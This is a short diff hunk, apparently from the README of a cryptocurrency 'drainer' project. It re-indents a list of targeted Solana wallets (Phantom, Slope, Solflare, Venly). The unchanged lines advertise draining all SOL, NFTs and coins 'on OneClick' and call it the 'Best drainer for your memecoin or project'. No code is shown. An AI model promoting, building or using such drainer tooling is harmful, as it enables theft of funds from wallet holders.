@@ -9,10 +9,10 @@ Draine all $SOL / NFT / Coin's on OneClick !!
 
 
 # Wallet:
--Phantom
--Slope
--Solflare
--Venly
+  -Phantom
+  -Slope
+  -Solflare
+  -Venly
 
 Best drainer for your memecoin or project !!!! 
 
